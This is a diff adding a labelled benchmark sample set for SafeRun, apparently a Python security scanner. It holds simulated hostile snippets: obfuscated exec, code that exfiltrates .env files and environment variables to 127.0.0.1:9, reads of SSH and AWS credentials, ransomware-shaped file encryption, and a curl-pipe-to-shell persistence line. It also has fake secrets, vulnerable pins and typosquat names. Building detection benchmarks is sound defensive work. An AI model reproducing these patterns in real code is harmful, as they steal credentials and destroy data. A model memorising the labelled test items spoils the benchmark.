@@ -1,0 +1,1269 @@
+# SafeRun benchmark samples. Plain text; the runner writes each sample into a fresh temp folder at run time and deletes it afterwards.
+# Samples are SIMULATIONS written by the SafeRun authors: nothing here is real malware, and no sample is ever executed (SafeRun is only
+# ever called with "scan", never "run"). Exfiltration samples use the loopback placeholder 127.0.0.1:9 or example domains; destructive and
+# persistence samples touch only paths under the temp folder.
+#
+# Fields
+#   id        stable identifier
+#   kind      code = a single .py file | deps = a requirements.txt | names = package names for "saferun check-names" (SafeRun-only)
+#   category  group used for per-category counts
+#   label     the expected verdict, frozen before any tool was run: "bad" = should be flagged, "clean" = should not be flagged
+#   split     "dev" = may be used while writing and debugging the runner; "held-out" = run once, never used to change anything
+#   note      one line on why the sample has its label
+#   content   the file text (code and deps) or the list of names (names)
+#
+# Label meaning: "bad" means the code shows the behaviour of its category (or, for weak_practice and hardcoded_secret, an insecure
+# practice) and would be harmful or unsafe with real parameters. These are not all "malware": weak_practice is Bandit's home ground.
+# Dependency labels are frozen at the date below; "clean" pins are the latest releases on that date, and a later advisory is reported as
+# a flagged exception, not as a silent change.
+#
+# After the held-out run, SafeRun's rules and settings are NOT tuned to improve scores. Fixes need a new sample set.
+
+[meta]
+frozen = "2026-11-03"
+description = "SafeRun benchmark sample set, version 1"
+
+
+[[sample]]
+id = "dc-01"
+kind = "code"
+category = "dangerous_calls"
+label = "bad"
+split = "dev"
+note = "eval of raw user input"
+content = '''
+user_expr = input("expression: ")
+print(eval(user_expr))
+'''
+
+[[sample]]
+id = "dc-02"
+kind = "code"
+category = "dangerous_calls"
+label = "bad"
+split = "held-out"
+note = "exec of a command-line argument"
+content = '''
+import sys
+
+exec(sys.argv[1])
+'''
+
+[[sample]]
+id = "dc-03"
+kind = "code"
+category = "dangerous_calls"
+label = "bad"
+split = "dev"
+note = "os.system with concatenated user input"
+content = '''
+import os
+import sys
+
+os.system("ls -l " + sys.argv[1])
+'''
+
+[[sample]]
+id = "dc-04"
+kind = "code"
+category = "dangerous_calls"
+label = "bad"
+split = "held-out"
+note = "subprocess with shell=True and a formatted string"
+content = '''
+import subprocess
+import sys
+
+name = sys.argv[1]
+subprocess.run(f"echo hello {name}", shell=True)
+'''
+
+[[sample]]
+id = "dc-05"
+kind = "code"
+category = "dangerous_calls"
+label = "bad"
+split = "dev"
+note = "compile and exec of text read from a file"
+content = '''
+source = open("plugin.txt").read()
+exec(compile(source, "plugin", "exec"))
+'''
+
+[[sample]]
+id = "dc-06"
+kind = "code"
+category = "dangerous_calls"
+label = "bad"
+split = "held-out"
+note = "Popen with shell=True and a command taken from the environment"
+content = '''
+import os
+import subprocess
+
+cmd = os.environ.get("JOB_COMMAND", "true")
+subprocess.Popen(cmd, shell=True)
+'''
+
+[[sample]]
+id = "ds-01"
+kind = "code"
+category = "unsafe_deserialization"
+label = "bad"
+split = "dev"
+note = "pickle.loads on bytes read from a file"
+content = '''
+import pickle
+
+with open("data.bin", "rb") as fh:
+    obj = pickle.loads(fh.read())
+print(obj)
+'''
+
+[[sample]]
+id = "ds-02"
+kind = "code"
+category = "unsafe_deserialization"
+label = "bad"
+split = "held-out"
+note = "yaml.load without a safe loader"
+content = '''
+import yaml
+
+with open("config.yml") as fh:
+    cfg = yaml.load(fh)
+print(cfg)
+'''
+
+[[sample]]
+id = "ds-03"
+kind = "code"
+category = "unsafe_deserialization"
+label = "bad"
+split = "dev"
+note = "marshal.loads on bytes read from a file"
+content = '''
+import marshal
+
+with open("blob.bin", "rb") as fh:
+    obj = marshal.loads(fh.read())
+print(obj)
+'''
+
+[[sample]]
+id = "ds-04"
+kind = "code"
+category = "unsafe_deserialization"
+label = "bad"
+split = "held-out"
+note = "pickle.load straight from a network socket"
+content = '''
+import pickle
+import socket
+
+srv = socket.socket()
+srv.bind(("127.0.0.1", 9100))
+srv.listen(1)
+conn, _ = srv.accept()
+msg = pickle.load(conn.makefile("rb"))
+print(msg)
+'''
+
+[[sample]]
+id = "ob-01"
+kind = "code"
+category = "obfuscated_payload"
+label = "bad"
+split = "dev"
+note = "base64 string decoded and exec'd"
+content = '''
+import base64
+
+exec(base64.b64decode("cHJpbnQoInNpbXVsYXRlZCBwYXlsb2FkIik="))
+'''
+
+[[sample]]
+id = "ob-02"
+kind = "code"
+category = "obfuscated_payload"
+label = "bad"
+split = "held-out"
+note = "zlib+base64 string decompressed and exec'd"
+content = '''
+import base64
+import zlib
+
+exec(zlib.decompress(base64.b64decode("eJwrKMrMK9FQKs7MLc1JLElNUShIrMzJT0xR0gQAhpsJlQ==")))
+'''
+
+[[sample]]
+id = "ob-03"
+kind = "code"
+category = "obfuscated_payload"
+label = "bad"
+split = "dev"
+note = "hex string converted to bytes and exec'd"
+content = '''
+exec(bytes.fromhex("7072696e74282273696d756c61746564207061796c6f61642229").decode())
+'''
+
+[[sample]]
+id = "ob-04"
+kind = "code"
+category = "obfuscated_payload"
+label = "bad"
+split = "held-out"
+note = "character codes joined into source and exec'd"
+content = '''
+codes = [112, 114, 105, 110, 116, 40, 34, 115, 105, 109, 117, 108, 97, 116, 101, 100, 32, 112, 97, 121, 108, 111, 97, 100, 34, 41]
+exec("".join(chr(c) for c in codes))
+'''
+
+[[sample]]
+id = "ob-05"
+kind = "code"
+category = "obfuscated_payload"
+label = "bad"
+split = "dev"
+note = "rot13 text decoded and exec'd"
+content = '''
+import codecs
+
+exec(codecs.decode('cevag("fvzhyngrq cnlybnq")', "rot13"))
+'''
+
+[[sample]]
+id = "ob-06"
+kind = "code"
+category = "obfuscated_payload"
+label = "bad"
+split = "held-out"
+note = "base64 decoded, compiled, then eval'd"
+content = '''
+import base64
+
+blob = base64.b64decode("cHJpbnQoInNpbXVsYXRlZCBwYXlsb2FkIik=")
+eval(compile(blob, "<blob>", "exec"))
+'''
+
+[[sample]]
+id = "ev-01"
+kind = "code"
+category = "evasion_variant"
+label = "bad"
+split = "dev"
+note = "'eval' built by string concatenation, fetched with getattr"
+content = '''
+import builtins
+
+fn = "ev" + "al"
+getattr(builtins, fn)("print('simulated payload')")
+'''
+
+[[sample]]
+id = "ev-02"
+kind = "code"
+category = "evasion_variant"
+label = "bad"
+split = "held-out"
+note = "'exec' name joined from characters, base64 payload"
+content = '''
+import base64
+import builtins
+
+name = "".join(["e", "x", "e", "c"])
+getattr(builtins, name)(base64.b64decode("cHJpbnQoInNpbXVsYXRlZCBwYXlsb2FkIik=").decode())
+'''
+
+[[sample]]
+id = "ev-03"
+kind = "code"
+category = "evasion_variant"
+label = "bad"
+split = "dev"
+note = "os.system reached through __import__ and getattr with split names"
+content = '''
+os_mod = __import__("o" + "s")
+getattr(os_mod, "sys" + "tem")("echo simulated payload")
+'''
+
+[[sample]]
+id = "ev-04"
+kind = "code"
+category = "evasion_variant"
+label = "bad"
+split = "held-out"
+note = "subprocess imported by name at run time, split attribute name"
+content = '''
+import importlib
+
+mod = importlib.import_module("sub" + "process")
+getattr(mod, "ru" + "n")(["echo", "simulated payload"])
+'''
+
+[[sample]]
+id = "ev-05"
+kind = "code"
+category = "evasion_variant"
+label = "bad"
+split = "dev"
+note = "exec looked up through vars(builtins)"
+content = '''
+import builtins
+
+vars(builtins)["ex" + "ec"]("print('simulated payload')")
+'''
+
+[[sample]]
+id = "ev-06"
+kind = "code"
+category = "evasion_variant"
+label = "bad"
+split = "held-out"
+note = "function name itself stored base64-encoded"
+content = '''
+import base64
+import builtins
+
+fn_name = base64.b64decode("ZXZhbA==").decode()
+getattr(builtins, fn_name)("print('simulated payload')")
+'''
+
+[[sample]]
+id = "ex-01"
+kind = "code"
+category = "exfiltration"
+label = "bad"
+split = "dev"
+note = "reads .env and POSTs it to a collector address"
+content = '''
+import urllib.request
+
+data = open(".env", "rb").read()
+req = urllib.request.Request("http://127.0.0.1:9/collect", data=data, method="POST")
+urllib.request.urlopen(req)
+'''
+
+[[sample]]
+id = "ex-02"
+kind = "code"
+category = "exfiltration"
+label = "bad"
+split = "held-out"
+note = "sends all environment variables over a raw socket"
+content = '''
+import os
+import socket
+
+s = socket.create_connection(("127.0.0.1", 9))
+s.sendall(repr(dict(os.environ)).encode())
+s.close()
+'''
+
+[[sample]]
+id = "ex-03"
+kind = "code"
+category = "exfiltration"
+label = "bad"
+split = "dev"
+note = "uploads a local file with requests"
+content = '''
+import requests
+
+with open("notes.txt", "rb") as fh:
+    requests.post("http://127.0.0.1:9/upload", files={"f": fh})
+'''
+
+[[sample]]
+id = "ex-04"
+kind = "code"
+category = "exfiltration"
+label = "bad"
+split = "held-out"
+note = "mails a local file to a collector over SMTP"
+content = '''
+import smtplib
+
+body = open("notes.txt").read()
+with smtplib.SMTP("127.0.0.1", 9) as smtp:
+    smtp.sendmail("a@example.invalid", ["b@example.invalid"], body)
+'''
+
+[[sample]]
+id = "sr-01"
+kind = "code"
+category = "sensitive_file_read"
+label = "bad"
+split = "dev"
+note = "reads the SSH private key"
+content = '''
+import os
+
+path = os.path.expanduser("~/.ssh/id_rsa")
+print(len(open(path).read()))
+'''
+
+[[sample]]
+id = "sr-02"
+kind = "code"
+category = "sensitive_file_read"
+label = "bad"
+split = "held-out"
+note = "reads the AWS credentials file"
+content = '''
+import os
+
+path = os.path.expanduser("~/.aws/credentials")
+print(len(open(path).read()))
+'''
+
+[[sample]]
+id = "sr-03"
+kind = "code"
+category = "sensitive_file_read"
+label = "bad"
+split = "dev"
+note = "locates browser cookie databases"
+content = '''
+import glob
+import os
+
+pattern = os.path.expanduser("~/.config/*/Default/Cookies")
+print(glob.glob(pattern))
+'''
+
+[[sample]]
+id = "sr-04"
+kind = "code"
+category = "sensitive_file_read"
+label = "bad"
+split = "held-out"
+note = "tries to read /etc/shadow"
+content = '''
+try:
+    print(len(open("/etc/shadow").read()))
+except OSError as exc:
+    print("not readable:", exc)
+'''
+
+[[sample]]
+id = "de-01"
+kind = "code"
+category = "destructive"
+label = "bad"
+split = "dev"
+note = "recursive delete of a 'home' directory (stand-in under the temp folder)"
+content = '''
+import os
+import shutil
+import tempfile
+
+fake_home = os.path.join(tempfile.gettempdir(), "saferun-bench-fake-home")
+os.makedirs(fake_home, exist_ok=True)
+shutil.rmtree(fake_home)
+'''
+
+[[sample]]
+id = "de-02"
+kind = "code"
+category = "destructive"
+label = "bad"
+split = "held-out"
+note = "rm -rf through the shell on a stand-in path under the temp folder"
+content = '''
+import os
+import tempfile
+
+target = os.path.join(tempfile.gettempdir(), "saferun-bench-fake-docs")
+os.system("rm -rf " + target)
+'''
+
+[[sample]]
+id = "de-03"
+kind = "code"
+category = "destructive"
+label = "bad"
+split = "dev"
+note = "deletes every file in a stand-in 'documents' folder"
+content = '''
+import os
+import tempfile
+
+docs = os.path.join(tempfile.gettempdir(), "saferun-bench-fake-documents")
+os.makedirs(docs, exist_ok=True)
+for name in os.listdir(docs):
+    os.remove(os.path.join(docs, name))
+'''
+
+[[sample]]
+id = "de-04"
+kind = "code"
+category = "destructive"
+label = "bad"
+split = "held-out"
+note = "ransomware shape: rewrite each file then rename to .locked (stand-in folder)"
+content = '''
+import os
+import tempfile
+
+docs = os.path.join(tempfile.gettempdir(), "saferun-bench-fake-victim")
+os.makedirs(docs, exist_ok=True)
+for name in os.listdir(docs):
+    path = os.path.join(docs, name)
+    data = open(path, "rb").read()
+    open(path, "wb").write(bytes(b ^ 0x5A for b in data))
+    os.rename(path, path + ".locked")
+'''
+
+[[sample]]
+id = "pe-01"
+kind = "code"
+category = "persistence"
+label = "bad"
+split = "dev"
+note = "appends a download-and-run line to a stand-in .bashrc"
+content = '''
+import os
+import tempfile
+
+rc = os.path.join(tempfile.gettempdir(), "saferun-bench-fake-bashrc")
+with open(rc, "a") as fh:
+    fh.write("curl -s http://127.0.0.1:9/x.sh | sh\n")
+'''
+
+[[sample]]
+id = "pe-02"
+kind = "code"
+category = "persistence"
+label = "bad"
+split = "held-out"
+note = "writes a @reboot cron entry to a stand-in crontab file"
+content = '''
+import os
+import tempfile
+
+cron = os.path.join(tempfile.gettempdir(), "saferun-bench-fake-crontab")
+with open(cron, "w") as fh:
+    fh.write("@reboot python3 /tmp/saferun-bench-agent.py\n")
+'''
+
+[[sample]]
+id = "pe-03"
+kind = "code"
+category = "persistence"
+label = "bad"
+split = "dev"
+note = "writes a systemd user unit that restarts a script (stand-in folder)"
+content = '''
+import os
+import tempfile
+
+unit_dir = tempfile.mkdtemp(prefix="saferun-bench-units-")
+unit = "[Service]\nExecStart=/usr/bin/python3 /tmp/agent.py\nRestart=always\n[Install]\nWantedBy=default.target\n"
+with open(os.path.join(unit_dir, "agent.service"), "w") as fh:
+    fh.write(unit)
+'''
+
+[[sample]]
+id = "pe-04"
+kind = "code"
+category = "persistence"
+label = "bad"
+split = "held-out"
+note = "writes an autostart .desktop entry (stand-in folder)"
+content = '''
+import os
+import tempfile
+
+auto = tempfile.mkdtemp(prefix="saferun-bench-autostart-")
+with open(os.path.join(auto, "updater.desktop"), "w") as fh:
+    fh.write("[Desktop Entry]\nType=Application\nExec=python3 /tmp/agent.py\n")
+'''
+
+[[sample]]
+id = "hs-01"
+kind = "code"
+category = "hardcoded_secret"
+label = "bad"
+split = "dev"
+note = "AWS access key pair (AWS documentation example values)"
+content = '''
+import boto3
+
+client = boto3.client(
+    "s3",
+    aws_access_key_id="AKIAIOSFODNN7EXAMPLE",
+    aws_secret_access_key="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+)
+'''
+
+[[sample]]
+id = "hs-02"
+kind = "code"
+category = "hardcoded_secret"
+label = "bad"
+split = "held-out"
+note = "database password in a connection string"
+content = '''
+import sqlite3
+
+DB_PASSWORD = "correct-horse-battery-staple-123"
+dsn = "postgresql://admin:" + DB_PASSWORD + "@db.example.invalid/prod"
+print(dsn.split("@")[1])
+'''
+
+[[sample]]
+id = "hs-03"
+kind = "code"
+category = "hardcoded_secret"
+label = "bad"
+split = "dev"
+note = "GitHub-style personal access token (fake, wrong checksum)"
+content = '''
+import requests
+
+TOKEN = "ghp_0123456789abcdefghijklmnopqrstuvwxyzAB"
+requests.get("https://api.github.com/user", headers={"Authorization": "token " + TOKEN})
+'''
+
+[[sample]]
+id = "hs-04"
+kind = "code"
+category = "hardcoded_secret"
+label = "bad"
+split = "held-out"
+note = "private key block embedded in source (fake body)"
+content = '''
+PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
+MIIFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE
+-----END RSA PRIVATE KEY-----"""
+print(len(PRIVATE_KEY))
+'''
+
+[[sample]]
+id = "wp-01"
+kind = "code"
+category = "weak_practice"
+label = "bad"
+split = "dev"
+note = "MD5 used to hash passwords"
+content = '''
+import hashlib
+
+def hash_password(pw: str) -> str:
+    return hashlib.md5(pw.encode()).hexdigest()
+'''
+
+[[sample]]
+id = "wp-02"
+kind = "code"
+category = "weak_practice"
+label = "bad"
+split = "held-out"
+note = "session token from the non-cryptographic random module"
+content = '''
+import random
+import string
+
+token = "".join(random.choice(string.ascii_letters) for _ in range(32))
+print(token)
+'''
+
+[[sample]]
+id = "wp-03"
+kind = "code"
+category = "weak_practice"
+label = "bad"
+split = "dev"
+note = "tempfile.mktemp (race-prone)"
+content = '''
+import tempfile
+
+path = tempfile.mktemp()
+open(path, "w").write("x")
+'''
+
+[[sample]]
+id = "wp-04"
+kind = "code"
+category = "weak_practice"
+label = "bad"
+split = "held-out"
+note = "TLS verification turned off"
+content = '''
+import requests
+
+print(requests.get("https://example.invalid/", verify=False).status_code)
+'''
+
+[[sample]]
+id = "wp-05"
+kind = "code"
+category = "weak_practice"
+label = "bad"
+split = "dev"
+note = "Flask debug server bound to all interfaces"
+content = '''
+from flask import Flask
+
+app = Flask(__name__)
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", debug=True)
+'''
+
+[[sample]]
+id = "wp-06"
+kind = "code"
+category = "weak_practice"
+label = "bad"
+split = "held-out"
+note = "assert used as an authorization check"
+content = '''
+def delete_account(user):
+    assert user.is_admin
+    user.delete()
+'''
+
+[[sample]]
+id = "cn-01"
+kind = "code"
+category = "clean_normal"
+label = "clean"
+split = "dev"
+note = "argparse word counter"
+content = '''
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument("path")
+args = parser.parse_args()
+with open(args.path) as fh:
+    print(len(fh.read().split()))
+'''
+
+[[sample]]
+id = "cn-02"
+kind = "code"
+category = "clean_normal"
+label = "clean"
+split = "held-out"
+note = "reads JSON and prints a summary"
+content = '''
+import json
+
+with open("data.json") as fh:
+    items = json.load(fh)
+print(len(items), "items")
+'''
+
+[[sample]]
+id = "cn-03"
+kind = "code"
+category = "clean_normal"
+label = "clean"
+split = "dev"
+note = "CSV column average"
+content = '''
+import csv
+
+with open("scores.csv", newline="") as fh:
+    values = [float(row["score"]) for row in csv.DictReader(fh)]
+print(sum(values) / len(values))
+'''
+
+[[sample]]
+id = "cn-04"
+kind = "code"
+category = "clean_normal"
+label = "clean"
+split = "held-out"
+note = "lists Python files and sizes with pathlib"
+content = '''
+from pathlib import Path
+
+for p in sorted(Path(".").rglob("*.py")):
+    print(p, p.stat().st_size)
+'''
+
+[[sample]]
+id = "cn-05"
+kind = "code"
+category = "clean_normal"
+label = "clean"
+split = "dev"
+note = "SHA-256 of a file"
+content = '''
+import hashlib
+
+h = hashlib.sha256()
+with open("file.bin", "rb") as fh:
+    for chunk in iter(lambda: fh.read(65536), b""):
+        h.update(chunk)
+print(h.hexdigest())
+'''
+
+[[sample]]
+id = "cn-06"
+kind = "code"
+category = "clean_normal"
+label = "clean"
+split = "held-out"
+note = "HTTP GET with requests, status printed"
+content = '''
+import requests
+
+resp = requests.get("https://example.com/", timeout=10)
+print(resp.status_code)
+'''
+
+[[sample]]
+id = "cn-07"
+kind = "code"
+category = "clean_normal"
+label = "clean"
+split = "dev"
+note = "subprocess with an argument list"
+content = '''
+import subprocess
+
+subprocess.run(["git", "status", "--short"], check=True)
+'''
+
+[[sample]]
+id = "cn-08"
+kind = "code"
+category = "clean_normal"
+label = "clean"
+split = "held-out"
+note = "ast.literal_eval on a literal"
+content = '''
+import ast
+
+value = ast.literal_eval("[1, 2, 3]")
+print(sum(value))
+'''
+
+[[sample]]
+id = "cn-09"
+kind = "code"
+category = "clean_normal"
+label = "clean"
+split = "dev"
+note = "TemporaryDirectory write and read"
+content = '''
+import os
+import tempfile
+
+with tempfile.TemporaryDirectory() as d:
+    p = os.path.join(d, "a.txt")
+    with open(p, "w") as fh:
+        fh.write("hello")
+    print(open(p).read())
+'''
+
+[[sample]]
+id = "cn-10"
+kind = "code"
+category = "clean_normal"
+label = "clean"
+split = "held-out"
+note = "sqlite with parameterised queries"
+content = '''
+import sqlite3
+
+con = sqlite3.connect(":memory:")
+con.execute("CREATE TABLE t (name TEXT)")
+con.execute("INSERT INTO t VALUES (?)", ("alice",))
+print(con.execute("SELECT name FROM t WHERE name = ?", ("alice",)).fetchall())
+'''
+
+[[sample]]
+id = "cn-11"
+kind = "code"
+category = "clean_normal"
+label = "clean"
+split = "dev"
+note = "dataclass with logging"
+content = '''
+import logging
+from dataclasses import dataclass
+
+logging.basicConfig(level=logging.INFO)
+
+@dataclass
+class Point:
+    x: int
+    y: int
+
+logging.info("%s", Point(1, 2))
+'''
+
+[[sample]]
+id = "cn-12"
+kind = "code"
+category = "clean_normal"
+label = "clean"
+split = "held-out"
+note = "API key read from the environment"
+content = '''
+import os
+
+key = os.environ.get("SERVICE_API_KEY")
+if not key:
+    raise SystemExit("SERVICE_API_KEY is not set")
+print("key length", len(key))
+'''
+
+[[sample]]
+id = "hn-01"
+kind = "code"
+category = "hard_negative"
+label = "clean"
+split = "dev"
+note = "os.system with a fixed harmless command"
+content = '''
+import os
+
+os.system("clear")
+'''
+
+[[sample]]
+id = "hn-02"
+kind = "code"
+category = "hard_negative"
+label = "clean"
+split = "held-out"
+note = "a linter whose pattern list contains the words eval( exec( rm -rf"
+content = '''
+PATTERNS = ["eval(", "exec(", "rm -rf", "base64"]
+
+text = open("notes.txt").read()
+for pat in PATTERNS:
+    if pat in text:
+        print("mentioned:", pat)
+'''
+
+[[sample]]
+id = "hn-03"
+kind = "code"
+category = "hard_negative"
+label = "clean"
+split = "dev"
+note = "decodes embedded base64 data and writes it to a file (never executed)"
+content = '''
+import base64
+
+LOGO = "c2FmZXJ1biBiZW5jaG1hcmsgbG9nbyBieXRlcw=="
+with open("logo.bin", "wb") as fh:
+    fh.write(base64.b64decode(LOGO))
+'''
+
+[[sample]]
+id = "hn-04"
+kind = "code"
+category = "hard_negative"
+label = "clean"
+split = "held-out"
+note = "deletes only the temp directory it created itself"
+content = '''
+import shutil
+import tempfile
+
+work = tempfile.mkdtemp()
+try:
+    open(work + "/scratch.txt", "w").write("x")
+finally:
+    shutil.rmtree(work)
+'''
+
+[[sample]]
+id = "hn-05"
+kind = "code"
+category = "hard_negative"
+label = "clean"
+split = "dev"
+note = "getattr dispatch limited to a fixed allowlist"
+content = '''
+import sys
+
+class Commands:
+    def cmd_start(self):
+        print("start")
+
+    def cmd_stop(self):
+        print("stop")
+
+ALLOWED = {"start", "stop"}
+name = sys.argv[1]
+if name in ALLOWED:
+    getattr(Commands(), "cmd_" + name)()
+'''
+
+[[sample]]
+id = "hn-06"
+kind = "code"
+category = "hard_negative"
+label = "clean"
+split = "held-out"
+note = "MD5 as a cache key, flagged as non-security"
+content = '''
+import hashlib
+
+def cache_key(data: bytes) -> str:
+    return hashlib.md5(data, usedforsecurity=False).hexdigest()
+'''
+
+[[sample]]
+id = "hn-07"
+kind = "code"
+category = "hard_negative"
+label = "clean"
+split = "dev"
+note = "TCP connect to localhost as a health check"
+content = '''
+import socket
+
+try:
+    socket.create_connection(("127.0.0.1", 8080), timeout=2).close()
+    print("up")
+except OSError:
+    print("down")
+'''
+
+[[sample]]
+id = "hn-08"
+kind = "code"
+category = "hard_negative"
+label = "clean"
+split = "held-out"
+note = "help text that mentions keyloggers and password stealers"
+content = '''
+HELP = """This tool checks whether a file looks like a keylogger or a password
+stealer. It only reads text and prints a warning. It never runs the file."""
+print(HELP)
+'''
+
+[[sample]]
+id = "hn-09"
+kind = "code"
+category = "hard_negative"
+label = "clean"
+split = "dev"
+note = "random.randint for a dice game"
+content = '''
+import random
+
+print("You rolled", random.randint(1, 6))
+'''
+
+[[sample]]
+id = "hn-10"
+kind = "code"
+category = "hard_negative"
+label = "clean"
+split = "held-out"
+note = "reads the app's own config under ~/.config"
+content = '''
+import json
+import os
+
+path = os.path.expanduser("~/.config/myapp/settings.json")
+if os.path.exists(path):
+    print(json.load(open(path)))
+'''
+
+[[sample]]
+id = "dp-01"
+kind = "deps"
+category = "dep_vulnerable"
+label = "bad"
+split = "dev"
+note = "old requests (known advisories)"
+content = '''
+requests==2.19.1
+idna==2.7
+'''
+
+[[sample]]
+id = "dp-02"
+kind = "deps"
+category = "dep_vulnerable"
+label = "bad"
+split = "held-out"
+note = "PyYAML 5.3 (known advisory)"
+content = '''
+pyyaml==5.3
+'''
+
+[[sample]]
+id = "dp-03"
+kind = "deps"
+category = "dep_vulnerable"
+label = "bad"
+split = "dev"
+note = "old urllib3 (known advisories)"
+content = '''
+urllib3==1.24.1
+'''
+
+[[sample]]
+id = "dp-04"
+kind = "deps"
+category = "dep_vulnerable"
+label = "bad"
+split = "held-out"
+note = "old Jinja2 and MarkupSafe (known advisories)"
+content = '''
+jinja2==2.10
+markupsafe==1.1.1
+'''
+
+[[sample]]
+id = "dp-05"
+kind = "deps"
+category = "dep_vulnerable"
+label = "bad"
+split = "dev"
+note = "old Flask and Werkzeug (known advisories)"
+content = '''
+flask==0.12.2
+werkzeug==0.14.1
+'''
+
+[[sample]]
+id = "dp-06"
+kind = "deps"
+category = "dep_vulnerable"
+label = "bad"
+split = "held-out"
+note = "Pillow 6.2.0 (known advisories)"
+content = '''
+pillow==6.2.0
+'''
+
+[[sample]]
+id = "dp-07"
+kind = "deps"
+category = "dep_vulnerable"
+label = "bad"
+split = "dev"
+note = "Django 2.2.0 (known advisories)"
+content = '''
+django==2.2.0
+'''
+
+[[sample]]
+id = "dp-08"
+kind = "deps"
+category = "dep_vulnerable"
+label = "bad"
+split = "held-out"
+note = "cryptography 2.1.4 (known advisory)"
+content = '''
+cryptography==2.1.4
+'''
+
+[[sample]]
+id = "dp-09"
+kind = "deps"
+category = "dep_current"
+label = "clean"
+split = "dev"
+note = "latest releases on 2026-11-03: requests, click"
+content = '''
+requests==2.34.2
+click==8.5.0
+'''
+
+[[sample]]
+id = "dp-10"
+kind = "deps"
+category = "dep_current"
+label = "clean"
+split = "held-out"
+note = "latest releases on 2026-11-03: flask, jinja2, pyyaml"
+content = '''
+flask==3.1.3
+jinja2==3.1.6
+pyyaml==6.0.3
+'''
+
+[[sample]]
+id = "dp-11"
+kind = "deps"
+category = "dep_current"
+label = "clean"
+split = "dev"
+note = "latest releases on 2026-11-03: urllib3, packaging"
+content = '''
+urllib3==2.8.0
+packaging==26.3
+'''
+
+[[sample]]
+id = "dp-12"
+kind = "deps"
+category = "dep_current"
+label = "clean"
+split = "held-out"
+note = "latest releases on 2026-11-03: numpy, pillow, django"
+content = '''
+numpy==2.5.4
+pillow==13.0.0
+django==6.1.2
+'''
+
+[[sample]]
+id = "nm-01"
+kind = "names"
+category = "name_lookalike"
+label = "bad"
+split = "dev"
+note = "typo of requests"
+names = ["reqeusts"]
+
+[[sample]]
+id = "nm-02"
+kind = "names"
+category = "name_lookalike"
+label = "bad"
+split = "held-out"
+note = "doubled letter in numpy"
+names = ["numpyy"]
+
+[[sample]]
+id = "nm-03"
+kind = "names"
+category = "name_lookalike"
+label = "bad"
+split = "dev"
+note = "doubled letter in python-dateutil"
+names = ["python-dateutill"]
+
+[[sample]]
+id = "nm-04"
+kind = "names"
+category = "name_lookalike"
+label = "bad"
+split = "held-out"
+note = "vowel swap of django"
+names = ["djanga"]
+
+[[sample]]
+id = "nm-05"
+kind = "names"
+category = "name_lookalike"
+label = "clean"
+split = "dev"
+note = "real popular names"
+names = ["requests", "numpy"]
+
+[[sample]]
+id = "nm-06"
+kind = "names"
+category = "name_lookalike"
+label = "clean"
+split = "held-out"
+note = "real popular names"
+names = ["flask", "pyyaml"]
